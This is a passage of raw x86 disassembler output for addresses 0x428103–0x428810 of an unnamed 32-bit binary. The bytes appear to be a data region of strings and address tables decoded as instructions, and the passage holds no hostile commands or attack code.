  428103:	ins    BYTE PTR es:[edi],dx
  428104:	outs   dx,DWORD PTR ds:[esi]
  428105:	ja     0x428107
  428107:	popa   
  428108:	ins    DWORD PTR es:[edi],dx
  428109:	imul   edi,DWORD PTR [edx+0x65],0x676f6e70
  428110:	push   ebp
  428111:	outs   dx,BYTE PTR ds:[esi]
  428112:	bound  esp,QWORD PTR [ebp+0x0]
  428115:	push   0x6572576d
  42811a:	outs   dx,BYTE PTR ds:[esi]
  42811b:	jne    0x428181
  42811d:	outs   dx,DWORD PTR ds:[esi]
  42811e:	popa   
  42811f:	push   0x6b637573
  428124:	add    BYTE PTR [ebp+0x6f],cl
  428127:	ins    DWORD PTR es:[edi],dx
  428128:	imul   ecx,DWORD PTR [ebp+0x75],0x6c617367
  42812f:	jo     0x428196
  428131:	je     0x428133
  428133:	dec    edx
  428134:	gs jae 0x4281aa
  428137:	ins    BYTE PTR es:[edi],dx
  428138:	outs   dx,DWORD PTR ds:[esi]
  428139:	dec    edi
  42813a:	js     0x4281a1
  42813c:	outs   dx,BYTE PTR ds:[esi]
  42813d:	outs   dx,DWORD PTR ds:[esi]
  42813e:	jb     0x4281a1
  428140:	add    BYTE PTR [edi+0x6f],al
  428143:	ja     0x4281a9
  428145:	dec    ebp
  428146:	imul   esi,DWORD PTR [ebx+0x6f],0x706179
  42814d:	imul   esi,DWORD PTR fs:[eax+0x6f],0x6d6f6d72
  428155:	imul   esp,DWORD PTR [ebx+0x6b],0x6c6c4900
  42815c:	jae    0x4281cb
  42815e:	popa   
  42815f:	fs jns 0x4281d1
  428162:	imul   ebp,DWORD PTR [ecx+0x0],0x6b
  428166:	imul   esi,DWORD PTR [edx+0x7a],0x64756261
  42816d:	bound  esi,QWORD PTR [ebp+0x6d]
  428170:	add    BYTE PTR [ebp+0x72],al
  428173:	outs   dx,DWORD PTR ds:[si]
  428175:	jo     0x4281d8
  428177:	jns    0x4281df
  428179:	imul   edi,DWORD PTR [eax+0x0],0x6d736e6f
  428180:	jne    0x4281ef
  428182:	popa   
  428183:	gs fs jo 0x4281ec
  428187:	imul   esi,DWORD PTR [esi+0x79],0x67756800
  42818e:	dec    esp
  42818f:	outs   dx,DWORD PTR ds:[esi]
  428190:	jne    0x4281f6
  428192:	push   0x6d6d7069
  428197:	add    BYTE PTR [edi+0x6c],al
  42819a:	outs   dx,DWORD PTR ds:[esi]
  42819b:	jo     0x4281f0
  42819d:	ja     0x42820e
  42819f:	bound  eax,QWORD PTR [eax]
  4281a1:	jns    0x428212
  4281a3:	pop    ecx
  4281a4:	gs ins BYTE PTR es:[edi],dx
  4281a6:	jo     0x428201
  4281a8:	jne    0x428216
  4281aa:	gs gs jae 0x42820f
  4281ae:	popa   
  4281af:	add    BYTE PTR [ecx+0x77],ah
  4281b2:	popa   
  4281b3:	inc    esi
  4281b4:	imul   ebp,DWORD PTR [esi+0x65],0x4f706173
  4281bb:	outs   dx,BYTE PTR ds:[esi]
  4281bc:	je     0x42822d
  4281be:	add    BYTE PTR [ebp+0x73],ah
  4281c1:	dec    esp
  4281c2:	imul   ebp,DWORD PTR [esi+0x67],0x68737574
  4281c9:	ins    BYTE PTR es:[edi],dx
  4281ca:	outs   dx,DWORD PTR ds:[esi]
  4281cb:	bound  esp,QWORD PTR [ebp+0x0]
  4281ce:	push   0x617a6761
  4281d3:	bound  ebp,QWORD PTR [edi+0x75]
  4281d6:	jo     0x4281d8
  4281d8:	inc    edx
  4281d9:	outs   dx,DWORD PTR ds:[esi]
  4281da:	jb     0x428250
  4281dc:	popa   
  4281dd:	js     0x42824e
  4281df:	data16 jo 0x428247
  4281e2:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x776f0077
  4281ea:	fs gs popa 
  4281ed:	outs   dx,DWORD PTR fs:[esi]
  4281ef:	jae    0x428269
  4281f1:	jne    0x4281f3
  4281f3:	inc    edi
  4281f4:	add    BYTE PTR [edi+0x0],ch
  4281f7:	add    BYTE PTR gs:[ebx+0x0],dh
  4281fb:	dec    edx
  4281fc:	add    BYTE PTR [ecx+0x0],ah
  4281ff:	jbe    0x428201
  428201:	popa   
  428202:	add    BYTE PTR [eax],al
  428204:	add    BYTE PTR [edx+0x0],al
  428207:	popa   
  428208:	add    BYTE PTR [edx+0x0],ah
  42820b:	jne    0x42820d
  42820d:	outs   dx,DWORD PTR ds:[esi]
  42820e:	add    BYTE PTR [ebp+0x0],ch
  428211:	push   0x6d00
  428216:	add    BYTE PTR [edx+0x0],dh
  428219:	popa   
  42821a:	add    BYTE PTR [eax+eax*1+0x74],dh
  42821e:	add    BYTE PTR [ecx+0x0],ah
  428221:	ins    DWORD PTR es:[edi],dx
  428222:	add    BYTE PTR [edi+0x0],ah
  428225:	popa   
  428226:	add    BYTE PTR [ecx+0x0],bh
  428229:	js     0x42822b
  42822b:	imul   eax,DWORD PTR [eax],0x610000
  428231:	ins    DWORD PTR es:[edi],dx
  428232:	add    BYTE PTR [ecx+0x0],ah
  428235:	ins    BYTE PTR es:[edi],dx
  428236:	add    BYTE PTR [edx+0x0],ah
  428239:	outs   dx,DWORD PTR ds:[esi]
  42823a:	add    BYTE PTR [edi+0x0],ch
  42823d:	popa   
  42823e:	add    BYTE PTR [eax+0x0],dh
  428241:	jo     0x428243
  428243:	add    BYTE PTR [eax],al
  428245:	popa   
  428246:	add    BYTE PTR [esi+0x0],dh
  428249:	popa   
  42824a:	add    BYTE PTR [edi+0x0],ah
  42824d:	outs   dx,DWORD PTR ds:[esi]
  42824e:	add    BYTE PTR [ebx+0x0],dh
  428251:	push   0x77006f00
  428256:	add    BYTE PTR [eax+eax*1+0x65],ch
  42825a:	add    BYTE PTR [ebp+0x0],dh
  42825d:	add    BYTE PTR fs:[ebp+0x0],ah
  428261:	add    BYTE PTR fs:[eax],al
  428264:	add    BYTE PTR [eax+0x0],cl
  428267:	popa   
  428268:	add    BYTE PTR [edx+0x0],dh
  42826b:	add    BYTE PTR gs:[edx+0x0],al
  42826f:	imul   eax,DWORD PTR [eax],0x6b0072
  428275:	arpl   WORD PTR [eax],ax
  428277:	popa   
  428278:	add    BYTE PTR [ebp+0x0],ch
  42827b:	add    BYTE PTR [eax],al
  42827d:	imul   eax,DWORD PTR [eax],0x61
  428280:	add    BYTE PTR [edi+0x0],dh
  428283:	popa   
  428284:	add    BYTE PTR [eax+0x0],bh
  428287:	outs   dx,DWORD PTR ds:[esi]
  428288:	add    BYTE PTR [edi+0x0],ch
  42828b:	je     0x42828d
  42828d:	add    BYTE PTR [eax],al
  42828f:	jb     0x428291
  428291:	jne    0x428293
  428293:	add    BYTE PTR gs:[ecx+0x0],ah
  428297:	ins    BYTE PTR es:[edi],dx
  428298:	add    BYTE PTR [eax+eax*1+0x68],ch
  42829c:	add    BYTE PTR [ebp+0x0],ch
  42829f:	ins    DWORD PTR es:[edi],dx
  4282a0:	add    BYTE PTR [eax],al
  4282a2:	add    BYTE PTR [edi+0x0],ch
  4282a5:	add    BYTE PTR gs:[eax+0x0],bh
  4282a9:	imul   eax,DWORD PTR [eax],0x650072
  4282af:	ja     0x4282b1
  4282b1:	outs   dx,DWORD PTR ds:[esi]
  4282b2:	add    BYTE PTR [ebp+0x0],ah
  4282b5:	popa   
  4282b6:	add    BYTE PTR [edx+0x0],ah
  4282b9:	ins    BYTE PTR es:[edi],dx
  4282ba:	add    BYTE PTR [ecx+0x0],ch
  4282bd:	add    BYTE PTR [eax],al
  4282bf:	jne    0x4282c1
  4282c1:	ins    DWORD PTR es:[edi],dx
  4282c2:	add    BYTE PTR [esi+0x0],ch
  4282c5:	outs   dx,DWORD PTR ds:[esi]
  4282c6:	add    BYTE PTR [edi+0x0],ah
  4282c9:	bound  eax,QWORD PTR [eax]
  4282cb:	popa   
  4282cc:	add    BYTE PTR [esi+0x0],dh
  4282cf:	outs   dx,DWORD PTR ds:[esi]
  4282d0:	add    BYTE PTR [edi+0x0],dh
  4282d3:	bound  eax,QWORD PTR [eax]
  4282d5:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  4282da:	add    BYTE PTR [eax],al
  4282dc:	add    bh,dh
  4282de:	sub    al,0x10
  4282e0:	add    BYTE PTR [esi],bl
  4282e2:	aaa    
  4282e3:	adc    BYTE PTR [eax],al
  4282e5:	and    al,0x42
  4282e7:	adc    BYTE PTR [eax],al
  4282e9:	rol    BYTE PTR [eax+edx*1],cl
  4282ec:	add    ch,dh
  4282ee:	xor    BYTE PTR [eax],dl
  4282f0:	add    BYTE PTR [esi-0x1affefcf],dh
  4282f6:	cmp    dl,BYTE PTR [eax]
  4282f8:	add    BYTE PTR [ebx],dh
  4282fa:	ins    BYTE PTR es:[edi],dx
  4282fb:	adc    BYTE PTR [eax],al
  4282fd:	sub    DWORD PTR [eax+edx*1+0x0],esp
  428301:	push   ecx
  428302:	inc    ecx
  428303:	adc    BYTE PTR [eax],al
  428305:	mov    cl,0x60
  428307:	adc    BYTE PTR [eax],al
  428309:	aas    
  42830a:	or     al,0x10
  42830c:	add    al,bh
  42830e:	and    DWORD PTR [eax],edx
  428310:	add    BYTE PTR [edx+0x37],dl
  428313:	adc    BYTE PTR [eax],al
  428315:	test   eax,0xa3001054
  42831a:	add    DWORD PTR [eax],edx
  42831c:	add    BYTE PTR [edi],ah
  42831e:	push   esp
  42831f:	adc    BYTE PTR [eax],al
  428321:	cmc    
  428322:	push   esi
  428323:	adc    BYTE PTR [eax],al
  428325:	imul   ecx,DWORD PTR [ebx],0x10
  428328:	add    ch,bl
  42832a:	add    BYTE PTR [edx+0x0],0xe1
  42832e:	add    BYTE PTR [edx+0x0],0xe5
  428332:	add    BYTE PTR [edx+0x0],0xe9
  428336:	add    BYTE PTR [edx+0x0],0xed
  42833a:	add    BYTE PTR [edx+0x0],0xf1
  42833e:	add    BYTE PTR [edx+0x0],0xf5
  428342:	add    BYTE PTR [edx+0x0],0xf9
  428346:	add    BYTE PTR [edx+0x0],0xfd
  42834a:	add    BYTE PTR [edx+0x0],0x1
  42834e:	add    DWORD PTR [edx+0x0],0x5
  428352:	add    DWORD PTR [edx+0x0],0x9
  428356:	add    DWORD PTR [edx+0x0],0xd
  42835a:	add    DWORD PTR [edx+0x0],0x11
  42835e:	add    DWORD PTR [edx+0x0],0x15
  428362:	add    DWORD PTR [edx+0x0],0x19
  428366:	add    DWORD PTR [edx+0x0],0x1d
  42836a:	add    DWORD PTR [edx+0x0],0x21
  42836e:	add    DWORD PTR [edx+0x0],0x25
  428372:	add    DWORD PTR [edx+0x0],0xffffffb5
  428376:	add    DWORD PTR [edx+0x0],0xffffffb9
  42837a:	add    DWORD PTR [edx+0x0],0xffffffbd
  42837e:	add    DWORD PTR [edx+0x0],0xffffffc1
  428382:	add    DWORD PTR [edx+0x0],0xffffffc5
  428386:	add    DWORD PTR [edx+0x0],0xffffffc9
  42838a:	add    DWORD PTR [edx+0x0],0xffffffcd
  42838e:	add    DWORD PTR [edx+0x0],0xffffffd1
  428392:	add    DWORD PTR [edx+0x0],0xffffffd5
  428396:	add    DWORD PTR [edx+0x0],0xffffffd9
  42839a:	add    DWORD PTR [edx+0x0],0xffffffdd
  42839e:	add    DWORD PTR [edx+0x0],0xffffffe1
  4283a2:	add    DWORD PTR [edx+0x0],0xffffffe5
  4283a6:	add    DWORD PTR [edx+0x0],0xffffffe9
  4283aa:	add    DWORD PTR [edx+0x0],0xffffffed
  4283ae:	add    DWORD PTR [edx+0x0],0xfffffff1
  4283b2:	add    DWORD PTR [edx+0x0],0x63
  4283b6:	xor    BYTE PTR [eax],dl
  4283b8:	add    BYTE PTR [ecx+0x31],dl
  4283bb:	adc    BYTE PTR [eax],al
  4283bd:	ins    BYTE PTR es:[edi],dx
  4283be:	pop    edi
  4283bf:	adc    BYTE PTR [eax],al
  4283c1:	fwait
  4283c2:	cmp    eax,0x37fa0010
  4283c7:	adc    BYTE PTR [eax],al
  4283c9:	(bad)  
  4283ca:	pop    esi
  4283cb:	adc    BYTE PTR [eax],al
  4283cd:	call   0x1040:0xa400106a
  4283d4:	add    BYTE PTR [esi+0x23],ah
  4283d7:	adc    BYTE PTR [eax],al
  4283d9:	xor    DWORD PTR [eax],ebx
  4283db:	adc    BYTE PTR [eax],al
  4283dd:	mov    edi,DWORD PTR [edi]
  4283df:	adc    BYTE PTR [eax],al
  4283e1:	and    BYTE PTR [ecx+0x10],0x0
  4283e5:	clc    
  4283e6:	ja     0x4283f8
  4283e8:	add    BYTE PTR [eax],dh
  4283ea:	xor    dl,BYTE PTR [eax]
  4283ec:	add    BYTE PTR [edx+esi*2+0x6bfb0010],ch
  4283f3:	adc    BYTE PTR [eax],al
  4283f5:	mov    fs,WORD PTR [ebx+0x10]
  4283f8:	add    BYTE PTR [ecx+0x6200107e],bl
  4283fe:	daa    
  4283ff:	adc    BYTE PTR [eax],al
  428401:	mov    edi,0x2e001069
  428406:	sub    eax,0x413c0010
  42840b:	adc    BYTE PTR [eax],al
  42840d:	xor    BYTE PTR [eax],dh
  42840f:	adc    BYTE PTR [eax],al
  428411:	outs   dx,BYTE PTR ds:[esi]
  428412:	dec    edi
  428413:	adc    BYTE PTR [eax],al
  428415:	adc    eax,0xeb001025
  42841a:	bound  edx,QWORD PTR [eax]
  42841c:	add    BYTE PTR [edi],dh
  42841e:	and    dl,BYTE PTR [eax]
  428420:	add    BYTE PTR [ebx+0x1a],bl
  428423:	adc    BYTE PTR [eax],al
  428425:	mov    BYTE PTR [esi+0x10],ch
  428428:	add    BYTE PTR [esi],ah
  42842a:	pusha  
  42842b:	adc    BYTE PTR [eax],al
  42842d:	pop    es
  42842e:	adc    eax,0x1ca50010
  428433:	adc    BYTE PTR [eax],al
  428435:	cmc    
  428436:	add    DWORD PTR [edx+0x0],0xfffffff9
  42843a:	add    DWORD PTR [edx+0x0],0xfffffffd
  42843e:	add    DWORD PTR [edx+0x0],0x1
  428442:	test   BYTE PTR [edx+0x0],al
  428445:	add    eax,0x9004284
  42844a:	test   BYTE PTR [edx+0x0],al
  42844d:	or     eax,0x11004284
  428452:	test   BYTE PTR [edx+0x0],al
  428455:	adc    eax,0x19004284
  42845a:	test   BYTE PTR [edx+0x0],al
  42845d:	sbb    eax,0x21004284
  428462:	test   BYTE PTR [edx+0x0],al
  428465:	and    eax,0x29004284
  42846a:	test   BYTE PTR [edx+0x0],al
  42846d:	sub    eax,0x31004284
  428472:	test   BYTE PTR [edx+0x0],al
  428475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428476:	das    
  428477:	adc    BYTE PTR [eax],al
  428479:	add    bh,BYTE PTR [esi+0x10]
  42847c:	add    BYTE PTR [ebx],ch
  42847e:	adc    al,0x10
  428480:	add    BYTE PTR ds:0x4b001060,ah
  428486:	pop    edx
  428487:	adc    BYTE PTR [eax],al
  428489:	dec    ecx
  42848a:	jne    0x42849c
  42848c:	add    dh,ch
  42848e:	pop    esp
  42848f:	adc    BYTE PTR [eax],al
  428491:	push   edx
  428492:	cmp    eax,0x529b0010
  428497:	adc    BYTE PTR [eax],al
  428499:	pop    ss
  42849a:	cmp    dl,BYTE PTR [eax]
  42849c:	add    BYTE PTR [ebp-0x64ffef93],cl
  4284a2:	xor    eax,0x158d0010
  4284a7:	adc    BYTE PTR [eax],al
  4284a9:	adc    DWORD PTR [edi+0x10],ebp
  4284ac:	add    BYTE PTR [ecx+0x51],ch
  4284af:	adc    BYTE PTR [eax],al
  4284b1:	jmp    0x4284bf
  4284b3:	adc    BYTE PTR [eax],al
  4284b5:	jne    0x42843b
  4284b7:	inc    edx
  4284b8:	add    BYTE PTR [ecx-0x7c],bh
  4284bb:	inc    edx
  4284bc:	add    BYTE PTR [ebp-0x7c],bh
  4284bf:	inc    edx
  4284c0:	add    BYTE PTR [ecx-0x7affbd7c],al
  4284c6:	test   BYTE PTR [edx+0x0],al
  4284c9:	mov    DWORD PTR [edx+eax*2+0x42848d00],eax
  4284d0:	add    BYTE PTR [ecx-0x6affbd7c],dl
  4284d6:	test   BYTE PTR [edx+0x0],al
  4284d9:	cdq    
  4284da:	test   BYTE PTR [edx+0x0],al
  4284dd:	popf   
  4284de:	test   BYTE PTR [edx+0x0],al
  4284e1:	mov    eax,ds:0xa5004284
  4284e6:	test   BYTE PTR [edx+0x0],al
  4284e9:	test   eax,0xad004284
  4284ee:	test   BYTE PTR [edx+0x0],al
  4284f1:	mov    cl,0x84
  4284f3:	inc    edx
  4284f4:	add    bh,dl
  4284f6:	inc    ebp
  4284f7:	adc    BYTE PTR [eax],al
  4284f9:	xlat   BYTE PTR ds:[ebx]
  4284fa:	pusha  
  4284fb:	adc    BYTE PTR [eax],al
  4284fd:	lea    ebp,[eax+edx*1+0x0]
  428501:	hlt    
  428502:	add    BYTE PTR [eax],dl
  428504:	add    BYTE PTR [esp+esi*2],dl
  428507:	adc    BYTE PTR [eax],al
  428509:	out    0x44,al
  42850b:	adc    BYTE PTR [eax],al
  42850d:	dec    esi
  42850e:	bound  edx,QWORD PTR [eax]
  428510:	add    BYTE PTR [edi+ebp*2],ch
  428513:	adc    BYTE PTR [eax],al
  428515:	cmp    ebx,DWORD PTR [ebx]
  428517:	adc    BYTE PTR [eax],al
  428519:	inc    ebp
  42851a:	pop    ecx
  42851b:	adc    BYTE PTR [eax],al
  42851d:	imul   BYTE PTR [ecx+0x10]
  428520:	add    BYTE PTR [esi],ah
  428522:	arpl   WORD PTR [eax],dx
  428524:	add    BYTE PTR [ebp-0x4fffefee],bh
  42852a:	sbb    edx,DWORD PTR [eax]
  42852c:	add    BYTE PTR [ebx],ah
  42852e:	adc    BYTE PTR ds:[eax],al
  428531:	xchg   ebx,eax
  428532:	push   ecx
  428533:	adc    BYTE PTR [eax],al
  428535:	cmc    
  428536:	test   BYTE PTR [edx+0x0],al
  428539:	stc    
  42853a:	test   BYTE PTR [edx+0x0],al
  42853d:	std    
  42853e:	test   BYTE PTR [edx+0x0],al
  428541:	add    DWORD PTR [ebp-0x7afaffbe],eax
  428547:	inc    edx
  428548:	add    BYTE PTR [ecx],cl
  42854a:	test   DWORD PTR [edx+0x0],eax
  42854d:	or     eax,0x11004285
  428552:	test   DWORD PTR [edx+0x0],eax
  428555:	adc    eax,0x19004285
  42855a:	test   DWORD PTR [edx+0x0],eax
  42855d:	sbb    eax,0x21004285
  428562:	test   DWORD PTR [edx+0x0],eax
  428565:	and    eax,0x29004285
  42856a:	test   DWORD PTR [edx+0x0],eax
  42856d:	sub    eax,0x31004285
  428572:	test   DWORD PTR [edx+0x0],eax
	...
  428581:	add    BYTE PTR [eax],al
  428583:	add    BYTE PTR [eax],ch
  428585:	aad    0xb6
  428587:	dec    edi
  428588:	add    BYTE PTR [eax],al
  42858a:	add    BYTE PTR [eax],al
  42858c:	lock xchg ebp,eax
  42858e:	add    al,BYTE PTR [eax]
  428590:	add    DWORD PTR [eax],eax
  428592:	add    BYTE PTR [eax],al
  428594:	add    DWORD PTR [eax],eax
  428596:	add    BYTE PTR [eax],al
  428598:	add    DWORD PTR [eax],eax
  42859a:	add    BYTE PTR [eax],al
  42859c:	rcl    BYTE PTR [ebp-0x6a1ffffe],0x2
  4285a3:	add    al,dl
  4285a5:	xchg   ebp,eax
  4285a6:	add    al,BYTE PTR [eax]
	...
  4285b0:	ror    BYTE PTR [eax+0x2],0x0
  4285b7:	add    dh,bl
  4285b9:	mov    BYTE PTR [edx],al
  4285bb:	add    dl,dh
  4285bd:	mov    BYTE PTR [edx],al
  4285bf:	add    BYTE PTR [eax],cl
  4285c1:	mov    DWORD PTR [edx],eax
  4285c3:	add    BYTE PTR [eax],bl
  4285c5:	mov    DWORD PTR [edx],eax
  4285c7:	add    BYTE PTR [esi],ah
  4285c9:	mov    DWORD PTR [edx],eax
  4285cb:	add    BYTE PTR [esi],bh
  4285cd:	mov    DWORD PTR [edx],eax
  4285cf:	add    BYTE PTR [edx-0x77],cl
  4285d2:	add    al,BYTE PTR [eax]
  4285d4:	pusha  
  4285d5:	mov    DWORD PTR [edx],eax
  4285d7:	add    BYTE PTR [ecx+ecx*4+0x2],ch
  4285db:	add    BYTE PTR [esi-0x77],bh
  4285de:	add    al,BYTE PTR [eax]
  4285e0:	mov    cl,BYTE PTR [ecx-0x7665fffe]
  4285e6:	add    al,BYTE PTR [eax]
  4285e8:	stos   BYTE PTR es:[edi],al
  4285e9:	mov    DWORD PTR [edx],eax
  4285eb:	add    BYTE PTR [esi-0x3bfffd77],dh
  4285f1:	mov    DWORD PTR [edx],eax
  4285f3:	add    al,dl
  4285f5:	mov    DWORD PTR [edx],eax
  4285f7:	add    ah,bl
  4285f9:	mov    DWORD PTR [edx],eax
  4285fb:	add    dh,ah
  4285fd:	mov    DWORD PTR [edx],eax
  4285ff:	add    dl,bh
  428601:	mov    DWORD PTR [edx],eax
  428603:	add    BYTE PTR [edx+ecx*4],cl
  428606:	add    al,BYTE PTR [eax]
  428608:	push   ss
  428609:	mov    al,BYTE PTR [edx]
  42860b:	add    BYTE PTR [eax],ah
  42860d:	mov    al,BYTE PTR [edx]
  42860f:	add    BYTE PTR [eax],dh
  428611:	mov    al,BYTE PTR [edx]
  428613:	add    BYTE PTR [eax-0x76],al
  428616:	add    al,BYTE PTR [eax]
  428618:	push   edx
  428619:	mov    al,BYTE PTR [edx]
  42861b:	add    BYTE PTR [edx-0x76],ah
  42861e:	add    al,BYTE PTR [eax]
  428620:	jo     0x4285ac
  428622:	add    al,BYTE PTR [eax]
  428624:	jl     0x4285b0
  428626:	add    al,BYTE PTR [eax]
  428628:	mov    cl,BYTE PTR [edx-0x7565fffe]
  42862e:	add    al,BYTE PTR [eax]
  428630:	stos   BYTE PTR es:[edi],al
  428631:	mov    al,BYTE PTR [edx]
  428633:	add    BYTE PTR [eax-0x2ffffd76],bh
  428639:	mov    al,BYTE PTR [edx]
  42863b:	add    dl,bl
  42863d:	mov    al,BYTE PTR [edx]
  42863f:	add    dl,ch
  428641:	mov    al,BYTE PTR [edx]
  428643:	add    BYTE PTR [edx],al
  428645:	mov    eax,DWORD PTR [edx]
  428647:	add    BYTE PTR [ebx+ecx*4],dl
  42864a:	add    al,BYTE PTR [eax]
  42864c:	and    al,0x8b
  42864e:	add    al,BYTE PTR [eax]
  428650:	xor    al,0x8b
  428652:	add    al,BYTE PTR [eax]
  428654:	mov    eax,DWORD PTR ds:[edx]
  428657:	add    BYTE PTR [ebx+ecx*4+0x2],cl
  42865b:	add    BYTE PTR [ebx+ecx*4+0x2],bl
  42865f:	add    BYTE PTR [eax-0x75],ch
  428662:	add    al,BYTE PTR [eax]
	...
  42866c:	xchg   edx,eax
  42866d:	mov    eax,DWORD PTR [edx]
  42866f:	add    BYTE PTR [eax-0x4bfffd75],ah
  428675:	mov    eax,DWORD PTR [edx]
  428677:	add    dl,al
  428679:	mov    eax,DWORD PTR [edx]
  42867b:	add    al,bl
  42867d:	mov    eax,DWORD PTR [edx]
  42867f:	add    dl,ah
  428681:	mov    eax,DWORD PTR [edx]
  428683:	add    dh,ch
  428685:	mov    eax,DWORD PTR [edx]
  428687:	add    dh,bh
  428689:	mov    eax,DWORD PTR [edx]
  42868b:	add    BYTE PTR [eax],dl
  42868d:	mov    WORD PTR [edx],es
  42868f:	add    BYTE PTR [esi],ch
  428691:	mov    WORD PTR [edx],es
  428693:	add    BYTE PTR [eax-0x74],al
  428696:	add    al,BYTE PTR [eax]
  428698:	dec    esi
  428699:	mov    WORD PTR [edx],es
  42869b:	add    BYTE PTR [esp+ecx*4+0x2],bl
  42869f:	add    BYTE PTR [eax-0x74],dh
  4286a2:	add    al,BYTE PTR [eax]
  4286a4:	test   BYTE PTR [edx+eax*1+0x28c9400],cl
  4286ab:	add    BYTE PTR [edx-0x4ffffd74],ah
  4286b1:	mov    WORD PTR [edx],es
  4286b3:	add    dl,al
  4286b5:	mov    WORD PTR [edx],es
  4286b7:	add    ah,dl
  4286b9:	mov    WORD PTR [edx],es
  4286bb:	add    ah,ah
  4286bd:	mov    WORD PTR [edx],es
  4286bf:	add    dh,dh
  4286c1:	mov    WORD PTR [edx],es
  4286c3:	add    BYTE PTR [edx],al
  4286c5:	lea    eax,[edx]
  4286c7:	add    BYTE PTR [esi],dl
  4286c9:	lea    eax,[edx]
  4286cb:	add    BYTE PTR [edx],ch
  4286cd:	lea    eax,[edx]
  4286cf:	add    BYTE PTR [edx],bh
  4286d1:	lea    eax,[edx]
  4286d3:	add    BYTE PTR [esi-0x73],al
  4286d6:	add    al,BYTE PTR [eax]
  4286d8:	push   esp
  4286d9:	lea    eax,[edx]
  4286db:	add    BYTE PTR [edx-0x73],ah
  4286de:	add    al,BYTE PTR [eax]
  4286e0:	jb     0x42866f
  4286e2:	add    al,BYTE PTR [eax]
  4286e4:	mov    BYTE PTR [ebp-0x726bfffe],cl
  4286ea:	add    al,BYTE PTR [eax]
  4286ec:	mov    al,ds:0xac00028d
  4286f1:	lea    eax,[edx]
  4286f3:	add    dl,al
  4286f5:	lea    eax,[edx]
  4286f7:	add    ah,dl
  4286f9:	lea    eax,[edx]
  4286fb:	add    ah,ah
  4286fd:	lea    eax,[edx]
  4286ff:	add    dl,dh
  428701:	lea    eax,[edx]
  428703:	add    BYTE PTR [esi],al
  428705:	mov    es,WORD PTR [edx]
  428707:	add    BYTE PTR [esi+ecx*4],dl
  42870a:	add    al,BYTE PTR [eax]
  42870c:	sub    BYTE PTR [esi-0x71c5fffe],cl
  428712:	add    al,BYTE PTR [eax]
  428714:	dec    eax
  428715:	mov    es,WORD PTR [edx]
  428717:	add    BYTE PTR [esi+ecx*4+0x2],ah
  42871b:	add    BYTE PTR [esi-0x72],dh
  42871e:	add    al,BYTE PTR [eax]
  428720:	xchg   BYTE PTR [esi-0x715ffffe],cl
  428726:	add    al,BYTE PTR [eax]
  428728:	mov    dh,0x8e
  42872a:	add    al,BYTE PTR [eax]
  42872c:	les    ecx,FWORD PTR [esi-0x712dfffe]
  428732:	add    al,BYTE PTR [eax]
  428734:	call   0x44289c7
  428739:	pop    DWORD PTR [edx]
  42873b:	add    BYTE PTR [edx],dl
  42873d:	pop    DWORD PTR [edx]
  42873f:	add    BYTE PTR [edi+ecx*4],ah
  428742:	add    al,BYTE PTR [eax]
  428744:	cmp    BYTE PTR [edi-0x70b1fffe],cl
  42874a:	add    al,BYTE PTR [eax]
  42874c:	pop    DWORD PTR fs:[edx]
  42874f:	add    BYTE PTR [edx-0x71],bh
  428752:	add    al,BYTE PTR [eax]
  428754:	mov    BYTE PTR [edi-0x7063fffe],cl
  42875a:	add    al,BYTE PTR [eax]
  42875c:	lods   al,BYTE PTR ds:[esi]
  42875d:	pop    DWORD PTR [edx]
  42875f:	add    BYTE PTR [eax-0x35fffd71],bh
  428765:	pop    DWORD PTR [edx]
  428767:	add    dl,bl
  428769:	pop    DWORD PTR [edx]
  42876b:	add    ah,ch
  42876d:	pop    DWORD PTR [edx]
  42876f:	add    dl,bh
  428771:	pop    DWORD PTR [edx]
  428773:	add    BYTE PTR [eax+edx*4],cl
  428776:	add    al,BYTE PTR [eax]
  428778:	and    dl,BYTE PTR [eax-0x6fc1fffe]
  42877e:	add    al,BYTE PTR [eax]
  428780:	push   esp
  428781:	nop
  428782:	add    al,BYTE PTR [eax]
  428784:	xchg   ax,ax
  428786:	add    al,BYTE PTR [eax]
  428788:	js     0x42871a
  42878a:	add    al,BYTE PTR [eax]
  42878c:	mov    dl,BYTE PTR [eax-0x6f61fffe]
  428792:	add    al,BYTE PTR [eax]
  428794:	lods   al,BYTE PTR ds:[esi]
  428795:	nop
  428796:	add    al,BYTE PTR [eax]
  428798:	mov    esp,0xc8000290
  42879d:	nop
  42879e:	add    al,BYTE PTR [eax]
  4287a0:	(bad)  
  4287a1:	nop
  4287a2:	add    al,BYTE PTR [eax]
  4287a4:	out    dx,al
  4287a5:	nop
  4287a6:	add    al,BYTE PTR [eax]
  4287a8:	(bad)  
  4287a9:	nop
  4287aa:	add    al,BYTE PTR [eax]
  4287ac:	or     al,0x91
  4287ae:	add    al,BYTE PTR [eax]
  4287b0:	and    BYTE PTR [ecx-0x6ed1fffe],dl
  4287b6:	add    al,BYTE PTR [eax]
  4287b8:	cmp    dl,BYTE PTR [ecx-0x6eb3fffe]
  4287be:	add    al,BYTE PTR [eax]
  4287c0:	pop    esi
  4287c1:	xchg   ecx,eax
  4287c2:	add    al,BYTE PTR [eax]
  4287c4:	jo     0x428757
  4287c6:	add    al,BYTE PTR [eax]
  4287c8:	xchg   BYTE PTR [ecx-0x6e6dfffe],dl
  4287ce:	add    al,BYTE PTR [eax]
  4287d0:	mov    al,ds:0xac000291
  4287d5:	xchg   ecx,eax
  4287d6:	add    al,BYTE PTR [eax]
  4287d8:	mov    edx,0xce000291
  4287dd:	xchg   ecx,eax
  4287de:	add    al,BYTE PTR [eax]
  4287e0:	ficom  DWORD PTR [ecx-0x6e11fffe]
  4287e6:	add    al,BYTE PTR [eax]
  4287e8:	cli    
  4287e9:	xchg   ecx,eax
  4287ea:	add    al,BYTE PTR [eax]
  4287ec:	or     dl,BYTE PTR [edx-0x6de7fffe]
  4287f2:	add    al,BYTE PTR [eax]
  4287f4:	cs xchg edx,eax
  4287f6:	add    al,BYTE PTR [eax]
  4287f8:	add    BYTE PTR [eax],al
  4287fa:	add    BYTE PTR [eax],al
  4287fc:	inc    esi
  4287fd:	xchg   edx,eax
  4287fe:	add    al,BYTE PTR [eax]
  428800:	push   esp
  428801:	xchg   edx,eax
  428802:	add    al,BYTE PTR [eax]
  428804:	xchg   dx,ax
  428806:	add    al,BYTE PTR [eax]
  428808:	jle    0x42879c
  42880a:	add    al,BYTE PTR [eax]
  42880c:	nop
  42880d:	xchg   edx,eax
  42880e:	add    al,BYTE PTR [eax]
  428810:	mov    ds:0xbc000292,al
